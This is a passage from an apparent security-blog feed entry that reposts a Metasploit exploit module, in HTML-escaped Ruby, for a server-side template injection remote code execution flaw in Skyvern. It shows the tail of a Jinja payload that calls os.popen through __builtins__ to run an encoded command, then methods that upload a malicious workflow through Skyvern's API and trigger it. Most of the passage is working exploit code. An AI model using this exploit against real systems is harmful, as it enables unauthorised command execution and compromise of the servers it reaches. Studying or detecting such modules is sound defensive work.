x()._module.__builtins__[&#x27;__import__&#x27;](&#x27;os&#x27;).popen(&quot;<span class="hljs-subst">#&#123;payload.encoded&#125;</span>&quot;).read() &#125;&#125;\n  &#123;% endif %&#125;\n&#123;% endfor %&#125;&gt;</span>,<br>            <span class="hljs-symbol">url:</span> <span class="hljs-string">&#x27;&#x27;</span>,<br>            <span class="hljs-symbol">max_steps:</span> <span class="hljs-number">25</span>,<br>            <span class="hljs-symbol">totp_identifier:</span> <span class="hljs-literal">nil</span>,<br>            <span class="hljs-symbol">totp_verification_url:</span> <span class="hljs-literal">nil</span><br>          &#125;<br>        ]<br>      &#125;,<br>      <span class="hljs-symbol">is_saved_task:</span> <span class="hljs-literal">false</span><br>    &#125;<br>  <span class="hljs-keyword">end</span><br><br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">create_workflow</span><br>    res = send_request_cgi(&#123;<br>      <span class="hljs-string">&#x27;method&#x27;</span> =&gt; <span class="hljs-string">&#x27;POST&#x27;</span>,<br>      <span class="hljs-string">&#x27;uri&#x27;</span> =&gt; normalize_uri(<span class="hljs-string">&#x27;/api/v1/workflows&#x27;</span>),<br>      <span class="hljs-string">&#x27;headers&#x27;</span> =&gt; &#123; <span class="hljs-string">&#x27;X-API-Key&#x27;</span>: datastore[<span class="hljs-string">&#x27;API_KEY&#x27;</span>] &#125;,<br>      <span class="hljs-string">&#x27;ctype&#x27;</span> =&gt; <span class="hljs-string">&#x27;application/json&#x27;</span>,<br>      <span class="hljs-string">&#x27;data&#x27;</span> =&gt; create_workflow_json.to_json<br>    &#125;)<br>    fail_with(<span class="hljs-title class_">Failure</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:UnexpectedReply</span>, <span class="hljs-string">&#x27;Received unexpected response&#x27;</span>) <span class="hljs-keyword">unless</span> res&amp;.code == <span class="hljs-number">200</span><br><br>    res_json = res.get_json_document<br><br>    <span class="hljs-variable">@workflow_id</span> = res_json.fetch(<span class="hljs-string">&#x27;workflow_permanent_id&#x27;</span>, <span class="hljs-literal">nil</span>)<br><br>    fail_with(<span class="hljs-title class_">Failure</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:Unknown</span>, <span class="hljs-string">&#x27;Failed to upload workflow&#x27;</span>) <span class="hljs-keyword">unless</span> <span class="hljs-variable">@workflow_id</span><br>  <span class="hljs-keyword">end</span><br><br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">trigger_workflow</span><br>    res = send_request_cgi(&#123;<br>      <span class="hljs-string">&#x27;method&#x27;</span> =&gt; <span class="hljs-string">&#x27;POST&#x27;</span>,<br>      <span class="hljs-string">&#x27;uri&#x27;</span> =&gt; normalize_uri(<span class="hljs-string">&#x27;/api/v1/workflows/&#x27;</span>, <span class="hljs-variable">@workflow_id</span>, <span class="hljs-string">&#x27;/run&#x27;</span>),<br>      <span class="hljs-string">&#x27;headers&#x27;</span> =&gt; &#123; <span class="hljs-string">&#x27;X-API-Key&#x27;</span>: datastore[<span class="hljs-string">&#x27;API_KEY&#x27;</span>] &#125;,<br>      <span class="hljs-string">&#x27;ctype&#x27;</span> =&gt; <span class="hljs-string">&#x27;application/json&#x27;</span>,<br>      <span class="hljs-string">&#x27;data&#x27;</span> =&gt; &#123; <span class="hljs-symbol">workflow_id:</span> <span class="hljs-variable">@workflow_id</span> &#125;.to_json<br>    &#125;)<br><br>    fail_with(<span class="hljs-title class_">Failure</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:UnexpectedReply</span>, <span class="hljs-string">&#x27;Received unexpected response&#x27;</span>) <span class="hljs-keyword">unless</span> res&amp;.code == <span class="hljs-number">200</span><br><br>    res_json = res.get_json_document<br><br>    fail_with(<span class="hljs-title class_">Failure</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:Unknown</span>, <span class="hljs-string">&#x27;Failed to upload workflow&#x27;</span>) <span class="hljs-keyword">unless</span> res_json.fetch(<span class="hljs-string">&#x27;workflow_id&#x27;</span>, <span class="hljs-literal">nil</span>) |<span class="hljs-params"></span>| res_json.fetch(<span class="hljs-string">&#x27;workflow_run_id&#x27;</span>, <span class="hljs-literal">nil</span>)<br>  <span class="hljs-keyword">end</span><br><br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">check</span><br>    res = send_request_cgi(&#123;<br>      <span class="hljs-string">&#x27;method&#x27;</span> =&gt; <span class="hljs-string">&#x27;GET&#x27;</span>,<br>      <span class="hljs-string">&#x27;uri&#x27;</span> =&gt; normalize_uri(<span class="hljs-string">&#x27;/api/v1/workflows&#x27;</span>),<br>      <span class="hljs-string">&#x27;headers&#x27;</span> =&gt; &#123; <span class="hljs-string">&#x27;X-API-Key&#x27;</span>: datastore[<span class="hljs-string">&#x27;API_KEY&#x27;</span>] &#125;<br>    &#125;)<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-title class_">Exploit</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:CheckCode</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:Safe</span>(<span class="hljs-string">&#x27;Target is probably not Skyvern&#x27;</span>) <span class="hljs-keyword">unless</span> res&amp;.code == <span class="hljs-number">200</span><br><br>    res_json = res.get_json_document<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-title class_">Exploit</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:CheckCode</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:Unknown</span>(<span class="hljs-string">&#x27;Failed to get additional information - target is either not Skyvern or you used incorrect API key&#x27;</span>) <span class="hljs-keyword">unless</span> res_json<br><br>    <span class="hljs-title class_">Exploit</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:CheckCode</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:Detected</span>(<span class="hljs-string">&#x27;Target is Skyvern&#x27;</span>)<br>  <span class="hljs-keyword">end</span><br><br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">exploit</span><br>    create_workflow<br>    trigger_workflow<br>  <span class="hljs-keyword">end</span><br><br><span class="hljs-keyword">end</span><br><br></code></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;漏洞信息&quot;&gt;&lt;a href=&quot;#漏洞信息&quot; class=&quot;headerlink&quot; title=&quot;漏洞信息&quot;&gt;&lt;/a&gt;漏洞信息&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;漏洞名称：&lt;/strong&gt; Skyvern SSTI Remote Code Execution&lt;/p&gt;
</summary>
      
    
    
    
    <category term="Github Poc" scheme="http://example.com/categories/Github-Poc/"/>
    
    
    <category term="rapid7/metasploit-framework:github issues" scheme="http://example.com/tags/rapid7-metasploit-framework-github-issues/"/>
    
    <category term="服务端模板注入" scheme="http://example.com/tags/%E6%9C%8D%E5%8A%A1%E7%AB%AF%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
</feed>
